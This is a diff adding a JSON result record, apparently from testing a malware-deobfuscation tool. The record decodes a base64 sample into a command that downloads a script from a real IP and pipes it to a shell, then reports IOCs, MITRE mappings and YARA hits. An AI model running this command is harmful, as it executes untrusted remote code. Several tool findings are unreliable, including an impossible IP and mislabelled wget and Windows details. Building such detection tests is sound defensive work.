@@ -1,0 +1,599 @@
+{
+  "sample_id": "R2_S04_curl_urlurl_b64",
+  "wrap": "URL(URL(b64(P)))",
+  "input": "Y3VybCAtZnNTTCBodHRwOi8vMTcyLjEwNC4yNDQuNTEvaW5zdC5zaCB8IHNo",
+  "input_sha1": "4c43de4d5b3f6468e8315ae296694f8bd36f84a8",
+  "expected_plaintext": "curl -fsSL http://172.104.244.51/inst.sh | sh",
+  "expected_token": "curl",
+  "http_ms": 1853,
+  "status": 200,
+  "response": {
+    "recipe": [
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected"
+      },
+      {
+        "op": "download-shell-bg",
+        "args": {},
+        "reason": "Applied download-shell-bg"
+      }
+    ],
+    "output": "curl -fsSL http://172.104.244.51/inst.sh | sh\n\n\u2500\u2500\u2500\u2500 BASH_WGET_FLOCK_BACKGROUND (Feb 2026) \u2500\u2500\u2500\u2500\nDownload URL : http://172.104.244.51/inst.sh\nBehavior     : wget \u2192 shell pipe, backgrounded, often flock-guarded\n               to prevent parallel-run collisions (botnet hallmark).\nMITRE ATT&CK : T1105 (Ingress Tool Transfer), T1059.004 (Unix Shell),\n               T1027 (Obfuscated Files)\n\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart+archetype:BASH_WGET_FLOCK_BACKGROUND \u00b7 conf 100/100\n  Chain:       base64-decode \u2192 download-shell-bg\n\n  MITRE ATT&CK\n    T1105        \u00b7 Command and Control\n\n  LOLBIN       curl.exe\n\n  IOCs\n    URL       http://172.104.244.51/inst.sh\n    IP        172.104.244.51\n    IP        15.442.401.271\n    Domain    inst.sh\n\n  Behavior\n    1. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+    "notes": [
+      "Matched named wrapper archetype: `wget URL | (flock) | bash &` backgrounded downloader (botnet hallmark)."
+    ],
+    "detected_type": null,
+    "engine": "smart+archetype:BASH_WGET_FLOCK_BACKGROUND",
+    "reached_shellcode": false,
+    "confidence": 100,
+    "trace": [
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected",
+        "output_preview": "curl -fsSL http://172.104.244.51/inst.sh | sh",
+        "output_length": 45,
+        "evidence": {
+          "encoding": "Base64 (RFC 4648)",
+          "op": "base64-decode",
+          "length": 45,
+          "ascii": true,
+          "entropy": 4.386,
+          "hex_preview": "63 75 72 6c 20 2d 66 73 53 4c 20 68 74 74 70 3a \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "download-shell-bg",
+        "args": {},
+        "reason": "Applied download-shell-bg",
+        "output_preview": "curl -fsSL http://172.104.244.51/inst.sh | sh",
+        "output_length": 45,
+        "evidence": {
+          "encoding": "download-shell-bg",
+          "op": "download-shell-bg",
+          "length": 45,
+          "ascii": true,
+          "entropy": 4.386,
+          "hex_preview": "63 75 72 6c 20 2d 66 73 53 4c 20 68 74 74 70 3a \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      }
+    ],
+    "chain_ids": [
+      "base64-decode",
+      "download-shell-bg"
+    ],
+    "score": 100,
+    "custom_recipes_matched": [],
+    "boost": {
+      "enabled": true,
+      "signal_kind": "unknown",
+      "chain": [
+        "ps-join-char-array"
+      ],
+      "source": "history",
+      "confidence": 1.0,
+      "alternatives": [
+        {
+          "chain": [
+            "env-expand"
+          ],
+          "score": 40,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-b64",
+            "utf16le-or-utf8-decode"
+          ],
+          "score": 38,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-payload",
+            "base64-decode",
+            "xor",
+            "gzip-decompress"
+          ],
+          "score": 30,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "batch-var-slice"
+          ],
+          "score": 30,
+          "source": "history"
+        }
+      ],
+      "signals": {
+        "length": 60,
+        "length_bucket": "xs",
+        "entropy": 4.941,
+        "b64_density": 1.0,
+        "has_powershell": false,
+        "has_encoded_cmd": false,
+        "has_iwr": false,
+        "has_downloadstr": false,
+        "has_gzip_prefix": false,
+        "has_zlib_prefix": false,
+        "has_utf16le_hint": true,
+        "has_curl_pipe": false,
+        "has_wget_pipe": false,
+        "has_bash_prefix": false,
+        "has_mshta": false,
+        "has_certutil": false,
+        "has_rundll32": false,
+        "has_regsvr32": false,
+        "has_hex_stream": false,
+        "has_unicode_esc": false,
+        "has_url_encoded": false,
+        "has_html_entities": false,
+        "has_defanged": false,
+        "has_reg_persist": false,
+        "has_charcode": false
+      }
+    },
+    "boost_hit": false,
+    "corrupted_container": null,
+    "reasoning": null,
+    "layer_trace": [
+      {
+        "layer": "L0",
+        "engine": "archetype",
+        "chain_len": 1,
+        "score": 1.0,
+        "verdict": "matched"
+      },
+      {
+        "layer": "L1",
+        "engine": "smart",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      },
+      {
+        "layer": "L2",
+        "engine": "magic",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      }
+    ],
+    "l3_metadata": null,
+    "layer_iocs": [
+      {
+        "layer": 1,
+        "op": "base64-decode",
+        "iocs": {
+          "urls": [
+            "http://172.104.244.51/inst.sh"
+          ],
+          "ips": [
+            "172.104.244.51"
+          ],
+          "domains": [
+            "inst.sh"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "curl.exe",
+            "purposes": [
+              "Download"
+            ],
+            "mitre": [
+              "T1105"
+            ],
+            "description": "curl downloading files (LOLBAS on modern Windows)",
+            "snippet": "curl -fsSL http://172.104.244.51/inst.sh | sh",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/curl/",
+            "source": "curated"
+          }
+        ]
+      },
+      {
+        "layer": 2,
+        "op": "download-shell-bg",
+        "iocs": {
+          "urls": [
+            "http://172.104.244.51/inst.sh"
+          ],
+          "ips": [
+            "172.104.244.51"
+          ],
+          "domains": [
+            "inst.sh"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "curl.exe",
+            "purposes": [
+              "Download"
+            ],
+            "mitre": [
+              "T1105"
+            ],
+            "description": "curl downloading files (LOLBAS on modern Windows)",
+            "snippet": "curl -fsSL http://172.104.244.51/inst.sh | sh",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/curl/",
+            "source": "curated"
+          }
+        ]
+      }
+    ],
+    "analysis_mode": "balanced",
+    "verdict_card": {
+      "label": "Malicious",
+      "confidence": 80,
+      "reason": "URL surfaced in decoded output: http://172.104.244.51/inst.sh.",
+      "indicators": [
+        {
+          "label": "Low entropy (5.32) \u2014 data is likely readable / ASCII text",
+          "kind": "neutral"
+        },
+        {
+          "label": "Base64 (RFC 4648) layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://172.104.244.51/inst.sh",
+          "kind": "positive"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://172.104.244.51/inst.sh",
+          "kind": "positive"
+        }
+      ],
+      "recommended_action": "Contain source host, hunt for parent process, submit to sandbox / VirusTotal, and correlate URL / MITRE mapping."
+    },
+    "mode": "strict",
+    "risk": {
+      "verdict": "Malicious",
+      "level": "malicious",
+      "score": 80
+    },
+    "iocs": {
+      "urls": [
+        "http://172.104.244.51/inst.sh"
+      ],
+      "ips": [
+        "172.104.244.51",
+        "15.442.401.271"
+      ],
+      "domains": [
+        "inst.sh"
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "mitre": [
+      {
+        "id": "T1105",
+        "technique": "Ingress Tool Transfer",
+        "tactic": "Command and Control"
+      }
+    ],
+    "lolbas": [
+      {
+        "binary": "curl.exe",
+        "purposes": [
+          "Download"
+        ],
+        "mitre": [
+          "T1105"
+        ],
+        "description": "curl downloading files (LOLBAS on modern Windows)",
+        "snippet": "TEvaW5zdC5zaCB8IHNo curl -fsSL http://172.104.244.51/inst.sh | sh \u2500\u2500\u2500\u2500 BASH_WGET_FLOCK_BACKGROUND (Feb 2026) \u2500\u2500\u2500\u2500 Download URL : http://172.104.244.51/inst.sh Behav",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/curl/",
+        "source": "curated"
+      }
+    ],
+    "ti_shield": [
+      {
+        "layer": 0,
+        "label": "L0 \u00b7 RAW INPUT",
+        "op": "raw",
+        "preview": "Y3VybCAtZnNTTCBodHRwOi8vMTcyLjEwNC4yNDQuNTEvaW5zdC5zaCB8IHNo",
+        "iocs": {
+          "urls": [],
+          "ips": [],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [],
+        "yara": [],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 0,
+          "band": "none"
+        }
+      },
+      {
+        "layer": 1,
+        "label": "L1 \u00b7 BASE64-DECODE",
+        "op": "base64-decode",
+        "preview": "http://172.104.244.51/inst.sh 172.104.244.51 inst.sh",
+        "iocs": {
+          "urls": [
+            "http://172.104.244.51/inst.sh"
+          ],
+          "ips": [
+            "172.104.244.51"
+          ],
+          "domains": [
+            "inst.sh"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "curl.exe",
+            "purposes": [
+              "Download"
+            ],
+            "mitre": [
+              "T1105"
+            ],
+            "description": "curl downloading files (LOLBAS on modern Windows)",
+            "snippet": "curl -fsSL http://172.104.244.51/inst.sh | sh",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/curl/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [],
+        "yara": [],
+        "ti_hits": [],
+        "live_osint": {
+          "ips": [
+            {
+              "value": "172.104.244.51",
+              "reverse_dns": "172-104-244-51.ip.linodeusercontent.com",
+              "geo": {
+                "status": "success",
+                "country": "Germany",
+                "countryCode": "DE",
+                "regionName": "Hesse",
+                "city": "Frankfurt am Main",
+                "isp": "Akamai Technologies",
+                "org": "Linode",
+                "as": "AS63949 Akamai Connected Cloud",
+                "mobile": false,
+                "proxy": false,
+                "hosting": true,
+                "query": "172.104.244.51"
+              },
+              "abuseipdb": {
+                "abuse_confidence_score": 0,
+                "country_code": "DE",
+                "usage_type": "Data Center/Web Hosting/Transit",
+                "isp": "Linode",
+                "total_reports": 0,
+                "last_reported_at": "2021-05-03T22:01:35+00:00",
+                "is_tor": false
+              },
+              "otx": {
+                "pulse_count": 0,
+                "reputation": 0,
+                "pulses": []
+              }
+            }
+          ],
+          "domains": [
+            {
+              "value": "inst.sh",
+              "classification": {
+                "tld": "sh",
+                "is_high_risk_tld": false,
+                "is_onion": false,
+                "length": 7,
+                "has_dashes": false,
+                "num_subdomains": 0
+              },
+              "resolved_ips": [
+                "104.21.21.70",
+                "172.67.196.254"
+              ],
+              "urlscan": {
+                "total": 0,
+                "results": []
+              },
+              "otx": {
+                "pulse_count": 0,
+                "reputation": null,
+                "pulses": []
+              }
+            }
+          ],
+          "urls": [
+            {
+              "value": "http://172.104.244.51/inst.sh",
+              "scheme": "http",
+              "host": "172.104.244.51",
+              "path": "/inst.sh",
+              "port": null,
+              "is_onion": false,
+              "urlscan": {
+                "total": 0,
+                "results": []
+              },
+              "otx": {
+                "pulse_count": 0,
+                "reputation": null,
+                "pulses": []
+              }
+            }
+          ],
+          "hashes": [],
+          "sources_used": [
+            "ip-api.com (geolocation, no key)",
+            "system DNS (reverse lookup, resolution)",
+            "AbuseIPDB",
+            "URLScan.io",
+            "AlienVault OTX",
+            "Hybrid Analysis"
+          ]
+        },
+        "family_hint": null,
+        "severity": {
+          "score": 15,
+          "band": "low"
+        }
+      },
+      {
+        "layer": 2,
+        "label": "L2 \u00b7 DOWNLOAD-SHELL-BG",
+        "op": "download-shell-bg",
+        "preview": "http://172.104.244.51/inst.sh 172.104.244.51 inst.sh",
+        "iocs": {
+          "urls": [
+            "http://172.104.244.51/inst.sh"
+          ],
+          "ips": [
+            "172.104.244.51"
+          ],
+          "domains": [
+            "inst.sh"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "curl.exe",
+            "purposes": [
+              "Download"
+            ],
+            "mitre": [
+              "T1105"
+            ],
+            "description": "curl downloading files (LOLBAS on modern Windows)",
+            "snippet": "curl -fsSL http://172.104.244.51/inst.sh | sh",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/curl/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [],
+        "yara": [],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 15,
+          "band": "low"
+        }
+      },
+      {
+        "layer": "final",
+        "label": "L-FINAL \u00b7 DECODED PAYLOAD",
+        "op": "final",
+        "preview": "curl -fsSL http://172.104.244.51/inst.sh | sh\n\n\u2500\u2500\u2500\u2500 BASH_WGET_FLOCK_BACKGROUND (Feb 2026) \u2500\u2500\u2500\u2500\nDownload URL : http://172.104.244.51/inst.sh\nBehavior     : wget \u2192 shell pipe, backgrounded, often flock-guarded\n               to prevent parallel-run collisions (botnet hallmark).\nMITRE ATT&CK : T1105 (Ingress Tool Transfer), T1059.004 (Unix Shell),\n               T1027 (Obfuscated Files)\n",
+        "iocs": {
+          "urls": [
+            "http://172.104.244.51/inst.sh"
+          ],
+          "ips": [
+            "172.104.244.51"
+          ],
+          "domains": [
+            "inst.sh"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "curl.exe",
+            "purposes": [
+              "Download"
+            ],
+            "mitre": [
+              "T1105"
+            ],
+            "description": "curl downloading files (LOLBAS on modern Windows)",
+            "snippet": "curl -fsSL http://172.104.244.51/inst.sh | sh \u2500\u2500\u2500\u2500 BASH_WGET_FLOCK_BACKGROUND (Feb 2026) \u2500\u2500\u2500\u2500 Download URL : http://172.104.244.51/inst.sh Behav",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/curl/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [
+          {
+            "id": "T1105",
+            "technique": "Ingress Tool Transfer",
+            "tactic": "Command and Control"
+          }
+        ],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "Download",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          },
+          {
+            "rule": "Bash_Curl_Wget_Pipe_Shell",
+            "severity": "high",
+            "match": "curl -fsSL http://172.104.244.51/inst.sh | sh",
+            "description": "curl/wget output piped directly to shell \u2014 classic Linux dropper pattern"
+          },
+          {
+            "rule": "macOS_curl_pipe_shell",
+            "severity": "high",
+            "match": "curl -fsSL http://172.104.244.51/inst.sh | sh",
+            "description": "curl/wget piped directly to sh/bash/zsh/osascript \u2014 canonical macOS/Linux dropper"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 32,
+          "band": "low"
+        }
+      }
+    ],
+    "output_raw": "curl -fsSL http://172.104.244.51/inst.sh | sh\n\n\u2500\u2500\u2500\u2500 BASH_WGET_FLOCK_BACKGROUND (Feb 2026) \u2500\u2500\u2500\u2500\nDownload URL : http://172.104.244.51/inst.sh\nBehavior     : wget \u2192 shell pipe, backgrounded, often flock-guarded\n               to prevent parallel-run collisions (botnet hallmark).\nMITRE ATT&CK : T1105 (Ingress Tool Transfer), T1059.004 (Unix Shell),\n               T1027 (Obfuscated Files)\n",
+    "report_text": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart+archetype:BASH_WGET_FLOCK_BACKGROUND \u00b7 conf 100/100\n  Chain:       base64-decode \u2192 download-shell-bg\n\n  MITRE ATT&CK\n    T1105        \u00b7 Command and Control\n\n  LOLBIN       curl.exe\n\n  IOCs\n    URL       http://172.104.244.51/inst.sh\n    IP        172.104.244.51\n    IP        15.442.401.271\n    Domain    inst.sh\n\n  Behavior\n    1. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
+  }
+}
